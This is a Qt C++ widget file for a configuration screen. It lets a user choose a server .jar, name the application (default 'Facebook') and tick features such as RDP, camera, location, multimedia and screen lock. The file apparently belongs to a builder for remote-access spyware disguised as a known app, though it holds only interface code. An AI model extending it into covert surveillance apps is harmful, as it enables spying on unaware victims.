/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

#include "ConfigurationTemplate.h"
#include <QPainter>
#include <QScrollArea>
#include <QFileDialog>
#include <QDebug>

ConfigurationTemplate::ConfigurationTemplate(QWidget *parent) : QWidget(parent) {
    layout = new QVBoxLayout(this);

    // Título: "Seleccionar servidor"
    headerTemplate = new HeaderConfigurationTemplate();
    headerTemplate->setImage("/ruta/a/tu/imagen.png");
    connect(headerTemplate, &HeaderConfigurationTemplate::editImageRequested, this, &ConfigurationTemplate::editImage);

    layout->addWidget(headerTemplate);
    QLabel* serverLabel = new QLabel("Seleccionar servidor", this);
    QFont font = serverLabel->font();
    font.setBold(true);
    serverLabel->setFont(font);
    serverLabel->setStyleSheet("QLabel { color: white; }");
    layout->addWidget(serverLabel);

    // ComboBox de servidores con fondo blanco
    serverComboBox = new QComboBox(this);
    serverComboBox->addItems({"servidor-1.jar", "servidor-2.jar", "servidor-3.jar"});
    serverComboBox->setStyleSheet("QComboBox { background-color: white; color: black; }");
    layout->addWidget(serverComboBox);

    // Título: "Plantilla"
    QLabel* templateLabel = new QLabel("Nombre de aplicación", this);
    templateLabel->setFont(font);
    templateLabel->setStyleSheet("QLabel { color: white; }");
    layout->addWidget(templateLabel);

    // Campo de texto "Facebook" con fondo blanco
    templateLineEdit = new QLineEdit(this);
    templateLineEdit->setText("Facebook");
    templateLineEdit->setStyleSheet("QLineEdit { background-color: white; color: black; }");
    layout->addWidget(templateLineEdit);

    // Título: "Selector de funcionalidades"
    QLabel* functionalitiesLabel = new QLabel("Funcionalidades de la aplicación", this);
    functionalitiesLabel->setFont(font);
    functionalitiesLabel->setStyleSheet("QLabel { color: white; }");
    layout->addWidget(functionalitiesLabel);

    // Layout de funcionalidades sin scroll
    QWidget* functionalitiesWidget = new QWidget(this);
    QVBoxLayout* functionalitiesLayout = new QVBoxLayout(functionalitiesWidget);

    // Checkboxes de funcionalidades con cuadros blancos
    QStringList functionalities = {"TODO", "RDP", "CAMARA", "MULTIMEDIA",
                                   "LOCALIZACIÓN", "BLOQUEO DE PANTALLA",
                                   "CARGAS", "GENERAL"};
    for (const QString& functionality : functionalities) {
    QCheckBox* checkBox = new QCheckBox(functionality, functionalitiesWidget);
    functionalitiesCheckBoxes.append(checkBox);
    
    // Personalizar el estilo del checkbox, incluyendo una imagen personalizada para el checkmark
    checkBox->setStyleSheet(
        "QCheckBox { color: white; } "
        "QCheckBox::indicator { width: 15px; height: 15px; } "
        "QCheckBox::indicator:unchecked { background-color: black; border: 1px solid white; } "
        "QCheckBox::indicator:checked { background-color: black; border: 1px solid white; "
        "  image: url(:/icons/verify); }"
    );

    functionalitiesLayout->addWidget(checkBox);

    if (functionality == "GENERAL") {
        checkBox->setChecked(true);     // Siempre marcado
        checkBox->setEnabled(false);    // No se puede desmarcar
    }

    if (functionality == "TODO") {
        connect(checkBox, &QCheckBox::toggled, this, &ConfigurationTemplate::selectAllFunctionalities);
        }
    }


    functionalitiesWidget->setLayout(functionalitiesLayout);
    layout->addWidget(functionalitiesWidget);

    // Crear el scroll area y hacer que sea transparente
    QScrollArea* scrollArea = new QScrollArea(this);
    scrollArea->setWidgetResizable(true);

    scrollArea->setStyleSheet(
        "QScrollArea { background: transparent; }"
        "QScrollBar:vertical {"
        "    background: transparent;"
        "    width: 0px;"  // Ajusta el ancho a 0 para ocultar completamente la barra
        "}"
        "QScrollBar:horizontal {"
        "    background: transparent;"
        "    height: 0px;"  // Ajusta la altura a 0 para ocultar completamente la barra
        "}"
        "QScrollBar::handle:vertical, QScrollBar::handle:horizontal {"
        "    background: transparent;"
        "    border: none;"
        "}"
        "QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical,"
        "QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {"
        "    background: none;"
        "    border: none;"
        "}"
        "QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical,"
        "QScrollBar::left-arrow:horizontal, QScrollBar::right-arrow:horizontal {"
        "    background: none;"
        "    border: none;"
        "}"
    );

    // Crear un contenedor para los widgets y hacerlo transparente también
    QWidget* containerWidget = new QWidget(this);
    containerWidget->setLayout(layout);
    containerWidget->setStyleSheet("QWidget { background: transparent; }");

    // Establecer el widget transparente en el scroll area
    scrollArea->setWidget(containerWidget);

    // Layout principal con el scroll area
    QVBoxLayout* mainLayout = new QVBoxLayout(this);
    mainLayout->setContentsMargins(10, 25, 10, 30);
    mainLayout->addWidget(scrollArea);
    setLayout(mainLayout);
}

void ConfigurationTemplate::editImage() {
    // Abrir un diálogo para seleccionar imágenes
    QString imagePath = QFileDialog::getOpenFileName(
        this, 
        tr("Seleccionar Imagen"),               // Título del diálogo
        QString(),                              // Directorio inicial (puedes personalizarlo)
        tr("Imágenes (*.png *.jpg *.jpeg *.bmp)") // Filtros para los tipos de archivo
    );

    // Si se seleccionó un archivo, pasarlo a setImage
    if (!imagePath.isEmpty()) {
        headerTemplate->setImage(imagePath);
        qDebug() << "Ruta de imagen seleccionada:" << imagePath; // Mostrar la ruta en consola para depuración
    } else {
        qDebug() << "No se seleccionó ninguna imagen.";
    }
}

void ConfigurationTemplate::selectAllFunctionalities(bool checked) {
    // Al seleccionar "Todos", marcar/desmarcar todos los demás checkboxes
    for (QCheckBox* checkBox : functionalitiesCheckBoxes) {
        if (checkBox->text() == "GENERAL") {
            checkBox->setChecked(true);
            continue;  // Saltamos a la siguiente iteración, sin modificar "GENERAL"
        }
        if (checkBox->text() != "TODO") {
            checkBox->setChecked(checked);
        }
    }
}

void ConfigurationTemplate::resizeEvent(QResizeEvent* event) {
    // Recalcular los márgenes dinámicamente
    int paddingVertical = height() * 0.10;  // 10% del alto
    int paddingHorizontal = width() * 0.20; // 20% del ancho
    layout->setContentsMargins(paddingHorizontal, paddingVertical, paddingHorizontal, paddingVertical);

    QWidget::resizeEvent(event); // Llamar a la implementación por defecto
}

void ConfigurationTemplate::paintEvent(QPaintEvent *event) {
    QPainter painter(this);
    painter.setRenderHint(QPainter::Antialiasing);

    // Fondo negro semi-transparente
    QBrush brush(QColor(0, 0, 0, 115));  // Color de fondo negro con transparencia
    painter.setBrush(brush);

    // Pen para el borde
    QPen pen(QColor("#FF0000"));  // Color rojo para el borde
    pen.setWidth(4);
    painter.setPen(pen);

    // Calcular el padding dinámico para el borde del rectángulo
    int paddingHorizontal = width() * 0.20;  // 20% del ancho
    int paddingVertical = height() * 0.05;   // 10% de la altura

    // Dibujar rectángulo con bordes redondeados de 20px y el padding ajustado
    painter.drawRoundedRect(paddingHorizontal, paddingVertical,
                            width() - 2 * paddingHorizontal,
                            height() - 2 * paddingVertical, 20, 20);

    QWidget::paintEvent(event);
}
